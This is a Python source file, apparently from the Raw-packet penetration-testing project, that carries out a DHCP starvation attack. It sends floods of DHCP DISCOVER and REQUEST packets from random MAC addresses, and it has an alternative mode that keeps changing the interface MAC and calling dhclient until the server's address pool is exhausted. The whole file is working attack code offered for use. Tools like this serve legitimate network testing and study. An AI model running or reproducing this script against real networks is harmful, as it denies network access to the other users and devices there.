#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
dhcp_starvation.py: DHCP Starvation attack script
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from socket import socket, SOCK_RAW, AF_PACKET
from sys import exit
from os import system
from argparse import ArgumentParser
from datetime import datetime
from time import sleep, time
from random import randint
from json import dumps
from typing import Union, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion

# region Global variables
start_time: Union[None, float] = None
ack_received: bool = False
# endregion


# region Send DHCP discover packets
def send_dhcp_discover():
    sleep(1)
    base.print_info("Sending DHCP discover packets...")
    base.print_info("Delay between DISCOVER packets: ", str(args.delay), " sec.")
    base.print_info("Start sending packets: ", str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")))
    discover_raw_socket = socket(AF_PACKET, SOCK_RAW)
    discover_raw_socket.bind((listen_network_interface, 0))

    try:
        while True:
            client_mac = eth.make_random_mac()
            transaction_id = randint(1, 4294967295)
            discover_raw_socket.send(dhcp.make_discover_packet(ethernet_src_mac=your_mac_address,
                                                               client_mac=client_mac,
                                                               transaction_id=transaction_id,
                                                               relay_agent_ip=your_ip_address))
            transactions[transaction_id] = client_mac
            if int(time() - start_time) > args.timeout:
                if ack_received:
                    base.print_success("IP address pool is exhausted: ", 
                                       str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")))
                else:
                    base.print_error("DHCP Starvation failed timeout!")
                sleep(1)
                exit(1)
            sleep(int(args.delay))
    
    except KeyboardInterrupt:
        base.print_info("Exit")
        discover_raw_socket.close()
        exit(0)
# endregion


# region Send DHCP request
def send_dhcp_request(request):

    # region Variables
    global start_time
    global ack_received
    dhcp_server_ip: Union[None, str] = None
    dhcp_server_mac: Union[None, str] = None
    # endregion

    if 'DHCPv4' in request.keys():

        # region Get reply transaction id, client ip
        xid = request['BOOTP']['transaction-id']
        yiaddr = request['BOOTP']['your-ip-address']
        siaddr = request['BOOTP']['server-ip-address']
        # endregion

        # region Get DHCP server IP
        if dhcp_server_ip is None:
            if siaddr == "0.0.0.0":
                dhcp_server_ip = request['IPv4']['source-ip']
            else:
                dhcp_server_ip = siaddr
            dhcp_server_mac = request['Ethernet']['source']
        # endregion

        # region Rewrite start time
        start_time = time()
        # endregion

        # region DHCP OFFER
        if request['DHCPv4'][53] == 2:
            if args.find_dhcp:
                base.print_success("DHCP server IP: ", dhcp_server_ip)
                base.print_success("DHCP server MAC: ", dhcp_server_mac)
                base.print_success("DHCP packet: ")
                print(dumps(request, indent=4))
                exit(0)

            base.print_info("DHCP OFFER from: ", dhcp_server_ip, " your client ip: ", yiaddr)

            try:
                if args.not_send_hostname:
                    host_name = None
                else:
                    host_name = base.make_random_string(8)

                request_packet = dhcp.make_request_packet(ethernet_src_mac=your_mac_address,
                                                          client_mac=transactions[xid],
                                                          transaction_id=xid,
                                                          dhcp_message_type=3,
                                                          host_name=host_name,
                                                          requested_ip=yiaddr,
                                                          option_value=dhcp_option_value,
                                                          option_code=dhcp_option_code,
                                                          relay_agent_ip=your_ip_address)
                raw_socket.send(request_packet)
            except KeyError:
                # base.print_error("Key error, this transaction id: ", hex(xid), " not found in our transactions!")
                pass
        # endregion

        # region DHCP ACK
        if request['DHCPv4'][53] == 5:
            ack_received = True
            base.print_info("DHCP ACK from:   ", dhcp_server_ip, " your client ip: ", yiaddr)
        # endregion

        # region DHCP NAK
        if request['DHCPv4'][53] == 6:
            base.print_error("DHCP NAK from:   ", dhcp_server_ip, " your client ip: ", yiaddr)
        # endregion
# endregion


# region Main function
if __name__ == "__main__":

    # region Import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))
    from raw_packet.Utils.network import RawEthernet, RawDHCPv4, RawSniff
    from raw_packet.Utils.tm import ThreadManager
    from raw_packet.Utils.base import Base
    # endregion

    # region Init Raw-packet classes
    base: Base = Base()
    eth: RawEthernet = RawEthernet()
    dhcp: RawDHCPv4 = RawDHCPv4()
    sniff: RawSniff = RawSniff()
    thread_manager: ThreadManager = ThreadManager(2)
    # endregion

    # region Set variables
    transactions: Dict[str, str] = dict()
    # endregion

    try:
        # region Check user, platform and print banner
        base.check_user()
        base.check_platform()
        base.print_banner()
        # endregion

        # region Parse script arguments
        parser = ArgumentParser(description='DHCP Starvation attack script')
        parser.add_argument('-i', '--interface', type=str, help='Set interface name for send discover packets')
        parser.add_argument('-d', '--delay', type=int, help='Set delay time in seconds (default: 1)', default=1)
        parser.add_argument('-t', '--timeout', type=int, help='Set receiving timeout in seconds (default: 10)', default=10)
        parser.add_argument('-n', '--not_send_hostname', action='store_true', help='Do not send hostname in DHCP request')
        parser.add_argument('-v', '--dhcp_option_value', type=str, help='Set DHCP option value', default=None)
        parser.add_argument('-c', '--dhcp_option_code', type=int, help='Set DHCP option code (default: 12)', default=12)
        parser.add_argument('-f', '--find_dhcp', action='store_true', help='Only find DHCP server in your network')
        parser.add_argument('-m', '--mac_change', action='store_true', help='Use mac change technique')
        args = parser.parse_args()
        # endregion

        # region set DHCP option code and value
        dhcp_option_value: Union[None, str] = None
        dhcp_option_code: int = 12

        if args.dhcp_option_value is not None:
            dhcp_option_value = args.dhcp_option_value

        if args.dhcp_option_code != 12:
            dhcp_option_code = args.dhcp_option_code
        # endregion

        # region Get listen network interface, your IP address and MAC address
        if args.interface is None:
            base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
        listen_network_interface = base.network_interface_selection(args.interface)
        your_ip_address = base.get_interface_ip_address(listen_network_interface)
        your_mac_address = base.get_interface_mac_address(listen_network_interface)
        # endregion

        # region Create raw socket
        raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
        raw_socket.bind((listen_network_interface, 0))
        # endregion

        # region General output
        base.print_info("Listen network interface: ", listen_network_interface)
        base.print_info("Your IP address: ", your_ip_address)
        base.print_info("Your MAC address: ", your_mac_address)
        # endregion

        # region Get start time
        start_time = time()
        # endregion

        # region MAC change technique
        if args.mac_change:

            # region Get old ip and mac addresses
            old_mac_address = base.get_interface_mac_address(listen_network_interface)
            old_ip_address = base.get_interface_ip_address(listen_network_interface)
            # endregion

            # region Stop network
            base.print_info("Stop network ...")
            system('service network-manager stop')
            system('service networking stop 2>/dev/null')
            system('service network stop 2>/dev/null')
            # endregion

            while True:
                new_mac_address = eth.make_random_mac()

                # region Change MAC
                base.print_info("New MAC address: ", new_mac_address)
                system('ifconfig ' + listen_network_interface + ' down')
                system('ifconfig ' + listen_network_interface + ' hw ether ' + new_mac_address)
                system('ifconfig ' + listen_network_interface + ' up')
                # endregion

                # region Start network
                system('service network-manager start')
                system('service networking start 2>/dev/null')
                system('service network start 2>/dev/null')
                # endregion

                # region Check current MAC
                current_mac_address = base.get_interface_mac_address(listen_network_interface)
                if current_mac_address == old_mac_address:
                    base.print_error("MAC address not changed, the network driver may not support MAC address change!")
                    exit(1)
                # endregion

                # region Rewrite start time
                start_time = time()
                # endregion

                # region Dhclient
                system('dhclient ' + listen_network_interface + ' >/dev/null 2>&1')
                # endregion

                # region Check current IP
                current_ip_address = None
                while current_ip_address is None:
                    current_ip_address = base.get_interface_ip_address(listen_network_interface)
                    if int(time() - start_time) > args.timeout:
                        base.print_error("DHCP Starvation failed timeout!")
                        sleep(1)
                        exit(1)
                    sleep(1)

                if current_ip_address == old_ip_address:
                    base.print_error("IP address not changed, maybe IP address for this interface configured manually!")
                    exit(1)
                else:
                    base.print_info("Received a new IP address: ", current_ip_address)
                # endregion

                # region Rewrite old mac and ip addresses
                old_mac_address = current_mac_address
                old_ip_address = current_ip_address
                # endregion

                sleep(int(args.delay))
        # endregion

        # region Send DHCP Discover and Request packets
        else:

            # region Start DHCP sender in other thread
            thread_manager.add_task(send_dhcp_discover)
            # endregion

            # region Set network filter
            network_filters: Dict[str, Dict[str, Union[int, str]]] = {
                'IPv4': {'destination-ip': your_ip_address},
                'UDP': {'source-port': 67, 'destination-port': 67}
            }
            # endregion

            # region Start sniffer
            sniff.start(protocols=['IPv4', 'UDP', 'DHCPv4'], prn=send_dhcp_request, filters=network_filters)
            # endregion

        # endregion

    except KeyboardInterrupt:
        # region Start network
        system('service network-manager start')
        system('service networking start 2>/dev/null')
        system('service network start 2>/dev/null')
        # endregion

        base.print_info("Exit ...")
        exit(3)

# endregion
